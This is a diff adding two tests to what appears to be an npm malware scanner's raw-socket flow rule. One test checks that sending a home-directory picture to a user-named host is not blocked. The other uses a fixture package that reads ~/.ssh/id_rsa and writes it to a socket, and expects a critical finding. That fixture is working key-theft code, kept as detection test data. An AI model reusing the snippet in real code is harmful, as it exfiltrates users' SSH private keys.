@@ -168,6 +168,35 @@ class TestFlowRawChannel:
         )
         assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL
 
+    def test_a_home_file_sent_to_a_host_the_user_names_does_not_block(self, tmp_path) -> None:
+        # An SSH clipboard, a file sync, a mail client: a file from the home directory written to a
+        # socket whose host the user gives. HTTP's flow rule never blocks a home file to an unknown
+        # destination (FLOW_TO_DROP takes drop points and bare addresses); the raw channel did, 9
+        # benign npm units blocked on it alone and 0 of its 92 malware units without a secret,
+        # identity, environment or wallet flow beside it.
+        code = (
+            "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n"
+            "const [host, port] = process.argv.slice(2);\n"
+            "const img = fs.readFileSync(os.homedir() + '/Pictures/shot.png');\n"
+            "const s = net.connect(Number(port), host);\ns.write(img);\n"
+        )
+        pkg = Npm.build(
+            tmp_path, "demo-clip", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
+        )
+        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) < Severity.HIGH
+
+    def test_a_key_file_sent_to_a_host_the_user_names_still_blocks(self, tmp_path) -> None:
+        code = (
+            "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n"
+            "const [host, port] = process.argv.slice(2);\n"
+            "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');\n"
+            "const s = net.connect(Number(port), host);\ns.write(k);\n"
+        )
+        pkg = Npm.build(
+            tmp_path, "demo-raw", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
+        )
+        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL
+
     def test_a_home_file_read_and_kept_on_this_machine(self, tmp_path) -> None:
         code = (
             "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n"
